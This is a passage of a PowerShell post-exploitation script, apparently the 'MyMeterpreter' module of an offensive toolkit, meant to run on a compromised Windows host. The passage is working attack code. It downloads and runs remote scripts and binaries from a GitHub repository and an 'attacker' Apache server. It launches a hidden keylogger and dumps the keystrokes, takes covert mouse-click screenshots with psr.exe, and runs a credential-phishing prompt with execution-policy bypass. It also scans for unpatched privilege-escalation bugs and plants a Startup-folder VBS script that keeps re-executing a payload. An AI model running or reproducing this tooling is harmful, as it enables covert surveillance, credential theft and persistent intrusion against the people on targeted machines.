   If($StartWebServer -ieq "Python"){## Python http.server sellected as webserver
      If(-not(Test-Path -Path "$Env:TMP\webserver.ps1")){## Make sure auxiliary module exists on remote host
         Write-Host "[+] Task      : Downloading webserver.ps1 from github" -ForegroundColor Green
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/webserver.ps1 -Destination $Env:TMP\webserver.ps1 -ErrorAction SilentlyContinue|Out-Null   
      }

      ## Check downloaded file integrity
      $SizeDump = ((Get-Item -Path "$Env:TMP\webserver.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 44){## Corrupted download detected => DefaultFileSize: 44,685546875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\webserver.ps1"){Remove-Item -Path "$Env:TMP\webserver.ps1" -Force}
      }Else{
         ## Force the install of python 2 times if NOT installed on remote host
         Write-Host "[i] StopServer: Powershell -File `$Env:TMP\webserver.ps1 -SKill 1" -ForegroundColor Yellow
         powershell -File "$Env:TMP\webserver.ps1" -SForce 1 -SBind $Address -Sport $SPort
      }

   }ElseIf($StartWebServer -ieq "Powershell"){## Powershell sellected as webserver
      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
      If($IsClientAdmin){## Start-WebServer requires Administrator rigths to run
         If(-not(Test-Path -Path "$Env:TMP\Start-WebServer.ps1")){## Make sure auxiliary module exists on remote host
            Write-Host "[+] Task      : Downloading Start-WebServer.ps1 from github" -ForegroundColor Green
            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/Start-WebServer.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null   
         }

         ## Check downloaded file integrity
         $SizeDump = ((Get-Item -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue).length/1KB)
         If($SizeDump -lt 25){## Corrupted download detected => DefaultFileSize: 25,4453125/KB
            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1"){Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force}
         }Else{
            powershell -File $Env:TMP\Start-WebServer.ps1 "http://${Address}:$Sport/"
         }

      }Else{## ERROR: Shell running under UserLand Privileges
         Write-Host "[error] Abort, Administrator privileges required on shell" -ForegroundColor Red -BackgroundColor Black
      }
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($Upload -ne "false"){

   <#
   .SYNOPSIS
      Helper - Download Files from Attacker Apache2 (BitsTransfer)

   .NOTES
      File to Download must be stored in attacker apache2 webroot.
      -Upload and -ApacheAddr Are Mandatory parameters (required).
      -Destination parameter its auto set to $Env:TMP by default.

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
      Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1`n"
   Start-Sleep -Seconds 2

   ## Make sure we have all parameters required
   If($ApacheAddr -ieq "false" -or $ApacheAddr -ieq $null){## Mandatory parameter
      Write-Host "[error]: [ -ApacheAddr ] Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker-Apache ] -Destination [ Path\file.ps1 ]"
      Write-Host "example: .\MyMeterpreter.ps1 -Upload $Upload -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\$Upload"
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
   }
   If($Destination -ieq "false" -or $Destination -ieq $null){## [ -Destination ] parameter $null
      $Destination = "$Env:TMP\$Upload" ## NOT Mandatory parameter => Default: $Env:TMP
   }

   Write-Host "[+] Uploading $Upload to $Destination" -ForeGroundColor Green;Start-Sleep -Seconds 1
   If($ApacheAddr -Match '127.0.0.1'){## Localhost connections are NOT supported by this module
      Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported!" -ForeGroundColor Red -BackGroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
   }

   ## Download file using BitsTransfer
   Write-Host "[i] Trying to Download $Upload from $ApacheAddr Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
   Start-BitsTransfer -priority foreground -Source http://$ApacheAddr/$Upload -Destination $Destination -ErrorAction SilentlyContinue|Out-Null   
   If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $Upload using BitsTransfer service!" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1}

   ## Make sure that file was successfuly downloaded
   If(-not([System.IO.File]::Exists("$Destination")) -or $Upload -ieq $Null -or $Destination -ieq $null){
      Write-Host "[error]: BitsTransfer: Something went wrong with the download process!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker-Apache ] -Destination [ Path\file.ps1 ]"
      Write-Host "example: .\MyMeterpreter.ps1 -Upload $Upload -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\$Upload"
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter  
   }

   ## Check for downloaded file (script) integrity
   If(-not($Upload -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
      $Status = Get-Content -Path "$Destination" -EA SilentlyContinue
      If($Status -iMatch '^(<!DOCTYPE html)'){
         Write-Host "[abort] $Upload Download Corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }ElseIf($Status -iMatch '^(404)'){
         Write-Host "[abort] $Upload Not found in Remote Server (404)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }ElseIf($Status -ieq $Null){
         Write-Host "[abort] $Upload `$null Content Detected (corrupted)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }Else{
         ## File (script) successfuly Downloaded
         $Success = $True
      }
   }

   <#
   .NOTES
      This next function only accepts Binary.exe until 80/KB of File Size
      If you wish to increase the Size Limmit then modifie the follow line:
      If($SizeDump -lt 80){## Make sure BitsTransfer download => is NOT corrupted
   #>

   ## Check for downloaded Binary (exe) integrity
   If($Upload -iMatch '[.exe]$'){## Binary file download detected
      $SizeDump = ((Get-Item "$Destination" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 80){## Make sure BitsTransfer download => is NOT corrupted
         Write-Host "[abort] $Upload Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "[error] If you wish to increase the File Size Limmit, then manual"
         Write-Host "[error] edit this CmdLet and modifie line[673]: If(`$SizeDump -lt 80){"
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }
   }

   ## Build Object-Table Display
   If(Test-Path -Path "$Destination"){
      Get-ChildItem -Path "$Destination" -EA SilentlyContinue|Select-Object Directory,Name,Exists,CreationTime > $Env:TMP\Upload.log
      Get-Content -Path "$Env:TMP\Upload.log"
      Remove-Item "$Env:TMP\Upload.log" -Force
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
$Timer = Get-Date -Format 'HH:mm:ss'

   <#
   .SYNOPSIS
      Helper - Capture Remote Host Keystrokes ($Env:TMP)

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Keylogger Start
      Download/Execute void.exe in child process
      to be abble to capture system keystrokes

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier
      and delete keylogger and all respective files/logs
   #>

   If($Keylogger -ieq 'Start'){## Download binary from venom\GitHub (RAW)
      write-host "[+] Capture $Remote_hostName\$Env:USERNAME keystrokes." -ForeGroundColor Green;Start-Sleep -Seconds 1
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -Destination $Env:TMP\void.zip -ErrorAction SilentlyContinue|Out-Null   

      ## Check for Failed/Corrupted downloads
      $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
      If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void using BitsTransfer
         Write-Host "[fail] to download void.zip using BitsTransfer (BITS)" -ForeGroundColor Red -BackgroundColor Black
      }Else{

         ## De-Compress Keylogger Archive files into $env:TMP remote directory
         Expand-Archive -Path "$Env:TMP\void.zip" -DestinationPath "$Env:TMP\void" -Force -ErrorAction SilentlyContinue|Out-Null
         Move-Item $Env:TMP\void\void.exe $Env:TMP\void.exe -Force -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void" -Force -Recurse -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void.zip" -Force

         ## Start void.exe in an orphan process
         $KeyLoggerTimer = Get-Date -Format 'HH:mm:ss'
         Start-Process -WindowStyle hidden -FilePath "$Env:TMP\void.exe" -ErrorAction SilentlyContinue|Out-Null
         Start-Sleep -Milliseconds 2600;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

         ## Create Data Table for output
         $mytable = New-Object System.Data.DataTable
         $mytable.Columns.Add("StartTime")|Out-Null
         $mytable.Columns.Add("ProcessName")|Out-Null
         $mytable.Columns.Add("PID")|Out-Null
         $mytable.Columns.Add("LogFile")|Out-Null
         $mytable.Rows.Add("$KeyLoggerTimer",
                           "void.exe",
                           "$PIDS",
                           "$Env:TMP\void.log")|Out-Null

         ## Display Data Table
         $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
         Get-Content -Path "$Env:TMP\KeyDump.log"
         Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
      }
   }

   If($Keylogger -ieq 'Stop'){
      ## Dump captured keystrokes
      # Stops process and Delete files/logs
      Write-Host "Captured keystrokes" -ForegroundColor Green
      Write-Host "-------------------"
      If(Test-Path -Path "$Env:TMP\void.log"){## Read keylogger logfile
         $parsedata = Get-Content -Path "$Env:TMP\void.log"
         $Diplaydata = $parsedata  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
         Write-Host "$Diplaydata"
      };Write-Host ""
      write-host "[+] Stoping keylogger process (void.exe)" -ForeGroundColor Green;Start-Sleep -Seconds 1
      $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

      If($IDS){## keylogger process found
         taskkill /F /IM void.exe|Out-Null
         If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
            write-host "[i] Keylogger PID $IDS process successfuly stoped!" -ForegroundColor Yellow
         }Else{
            write-host "[fail] to terminate keylogger PID process!" -ForeGroundColor Red -BackgroundColor Black
         }
      }Else{
         write-host "[fail] keylogger process PID not found!" -ForeGroundColor Red -BackgroundColor Black
      }

      ## Clean old keylogger files\logs
      Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\void.exe" -EA SilentlyContinue -Force
      write-host "";Start-Sleep -Seconds 1
   }
}

If($Mouselogger -ieq "Start"){
## Random FileName generation
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
$CaptureFile = "$Env:TMP\SHot-"+"$Rand.zip"
If($Timmer -lt '10'){$Timmer = '10'} # Set the minimum capture time value

   <#
   .SYNOPSIS
      Helper - Capture Screenshots of MouseClicks For 'xx' Seconds

   .DESCRIPTION
      This script allow users to Capture target Screenshots of MouseClicks
      with the help of psr.exe native windows 10 (error report service) binary.
      'The capture will be stored under remote-host '$Env:TMP' directory'.
      'The minimum capture time its 8 seconds and 100 screenshots max'.

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 10
      Capture Screenshots of remote Mouse Clicks for 10 seconds
      And store the capture under '$Env:TMP' remote directory.
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -Mouselogger Start"
   Write-Host "Example: .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 10`n"
   Start-Sleep -Seconds 1

   ## Make sure psr.exe (LolBin) exists on remote host
   If(Test-Path "$Env:WINDIR\System32\psr.exe"){

      ## Create Data Table for output
      $mytable = New-Object System.Data.DataTable
      $mytable.Columns.Add("Capture")|Out-Null
      $mytable.Columns.Add("Timmer")|Out-Null
      $mytable.Columns.Add("Storage")|Out-Null
      $mytable.Rows.Add("MouseClicks",
                        "for $Timmer(sec)",
                        "$CaptureFile")|Out-Null

      ## Display Data Table
      $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
      Get-Content -Path "$Env:TMP\MyTable.log"
      Remove-Item -Path "$Env:TMP\MyTable.log" -Force

      ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
      Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $Timmer;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
      If(-not($LASTEXITCODE -eq 0)){write-host "[abort] @MyMeterpreter cant start psr.exe process" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 2}
   }Else{
      ## PSR.exe (error report service) not found in current system ..
      write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor Red -BackgroundColor Black
      Start-Sleep -Seconds 1
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($PhishCreds -ieq "Start"){

   <#
   .SYNOPSIS
      Promp the Current User for a Valid Credential.

   .NOTES
      Remark: This CmdLet interrupts EXPLORER process until a valid credential
      is entered correctly in Windows PromptForCredential MsgBox, only them it
      starts EXPLORER process and leaks the credentials on this terminal shell.

      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
      Remark: CredsPhish.ps1 CmdLet requires lmhosts and lanmanserver services.
      Remark: CredsPhish.ps1 CmdLet requires Admin privs to Start|Stop services

      Remark: On Windows 10 lmhosts and lanmanserver are running by default.
      So..Admin privs are NOT required for CredsPhish.ps1 to run. Unless the
      two services are stoped on target machine..(they are running by default)

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
      Prompt the current user for a valid credential.
   #>

   ## Download CredsPhish from my github repository
   Write-Host "[+] Prompt the current user for a valid credential." -ForeGroundColor Green
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1")){## Check for auxiliary existence
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/CredsPhish.ps1 -Destination $Env:TMP\CredsPhish.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 12,77734375/KB | OldSize: 6,15625(KB
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 12 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
   }

   ## Start Remote Host CmdLet
   powershell -exec bypass -NonInteractive -NoLogo -File $Env:TMP\CredsPhish.ps1
   Write-Host "";Start-Sleep -Seconds 1
}

If($EOP -ieq "ScanAll" -or $EOP -ieq "Default"){

   <#
   .SYNOPSIS
      Author: @_RastaMouse|r00t-3xp10it (sherlock.ps1 v1.3)
      Helper - Find Missing Software Patchs For Privilege Escalation

   .NOTES
      This Module does NOT exploit any vulnerabitys found.
      It will 'report' them and display the exploitdb POC link

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -EOP Default
      Scans GroupName Everyone and permissions (F)

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -EOP ScanAll
      Scans Three GroupNames and Permissions (F)(W)(M)

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>

   ## Download Sherlock (@_RastaMouse) from my github repository
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1")){## Check if auxiliary exists
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/sherlock.ps1 -Destination $Env:TMP\sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB)
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 16 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download Sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
      Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
   }

   ## Import-Module (-Force reloads the module everytime)
   $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
      Import-Module -Name "$Env:TMP\sherlock.ps1" -Force
      If($EOP -ieq "ScanAll"){## Use ALL Sherlock EoP functions
         Write-Host "[i] Please wait, this scan migth take more than 5 minuts!" -ForegroundColor Yellow -BackgroundColor Black
         Start-Sleep -Seconds 1;Use-AllModules FullRecon
      }ElseIf($EOP -ieq "Default"){## find missing CVE patchs
         Use-AllModules
      }
   }
   
   ## Delete sherlock script from remote system
   If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
   Write-Host "";Start-Sleep -Seconds 1
}

If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
$BeaconRawTime = "$BeaconTime"+"000" ## BeaconHome Timmer
$PCName = $Env:COMPUTERNAME

   <#
   .SYNOPSIS
      Persiste Scripts\Appl Using StartUp Folder

   .NOTES
      This persistence module beacons home in sellected intervals defined
      by CmdLet User with the help of -BeaconTime parameter. The objective
      its to execute our script on every startup from 'xx' to 'xx' seconds.
      Remark: Use double quotes if Path has any empty spaces in name

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Persiste Stop
      Stops wscript process (vbs) and delete persistence script

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Persiste $Env:USERPROFILE\Coding\PSwork\Client.ps1 -BeaconTime 10
      Execute Client.ps1 at StartUp with 10 sec of interval between executions
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -Persiste Stop"
   Write-Host "Example: .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Client.ps1"
   Write-Host "Example: .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Client.ps1 -BeaconTime 10`n"
   Start-Sleep -Seconds 2

   ## Variable Declarations
   $ClientName = $Persiste.Split('\\')[-1] ## Get File Name from Path
   $PersistePath = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs"

   If($Persiste -ne "false" -and $Persiste -ne "Stop"){

      ## Create Data Table for output
      Write-Host "$ClientName Persistence Settings" -ForegroundColor Green
      Write-Host "-------------------------------"
      Write-Host "BeaconHomeInterval : $BeaconTime (sec) interval"
      Write-Host "ClientAbsoluctPath : $Persiste"
      Write-Host "PersistenceScript  : $PersistePath"
   
      ## Create VBS beacon Home script
      If(-not(Test-Path -Path "$PersistePath" -EA SilentlyContinue)){         
         echo "Set objShell = WScript.CreateObject(`"WScript.Shell`")" > "$PersistePath"
         echo "Do" >> "$PersistePath"
         echo "wscript.sleep $BeaconRawTime" >> "$PersistePath"
         echo "objShell.Run `"powershell -Exec Bypass -W 1 -File $Persiste`", 0, True" >> "$PersistePath"
         echo "Loop" >> "$PersistePath"
      }

      ## Make sure Persiste vbs script its created
      If(Test-Path -Path "$PersistePath"){
         Write-Host "PersistenceScript  : Successfuly Created!"
      }Else{
         Write-Host "PersistenceScript  : Fail to create Persiste.vbs!" -ForegroundColor Red -BackgroundColor Black
      }

      ## Make sure wscript process its running
      $VbsProc = (Get-Process wscript -EA SilentlyContinue).Responding
      If($VbsProc -ieq "True"){
         Write-Host "wscriptProcStatus  : Wscript Proc Running!"
      }Else{
         Write-Host "wscriptProcStatus  : Stopped! (require restart)" -ForegroundColor Red -BackgroundColor Black
      }
   }
   

   ## Stop\Delete Persistence tasks
   If($Persiste -ieq "Stop"){## Check for wscript process status

      Write-Host "$ClientName Persistence Settings" -ForegroundColor Green
      Write-Host "-------------------------"
      Start-Sleep -Seconds 1

      $CheckProc = (Get-Process -name wscript -EA SilentlyContinue).Responding
      If($CheckProc -ieq "True"){## wscript proccess found running
         Write-Host "[i] Stoping Wscript (vbs) Process!"
         Start-Sleep -Seconds 1
         Stop-Process -Name wscript -Force
      }Else{## wscript proccess NOT found running
         Write-Host "[x] Wscript Process Not Found Running!" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1
      }

      If(Test-Path -Path "$PersistePath"){## Chcek for Persiste.vbs existance
         Write-Host "[i] Deleting Persiste.vbs aux Script!"
         Start-Sleep -Seconds 1
         Remove-Item -Path "$PersistePath" -Force
      }Else{## Persiste.vbs auxiliary script NOT found
         Write-Host "[x] Persiste.vbs aux Script Not Found!" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1
      }
      Write-Host "[i] Local Persistence Successfuly Deleted!" -ForegroundColor Yellow
   }     
   Write-Host "";Start-Sleep -Seconds 1
}
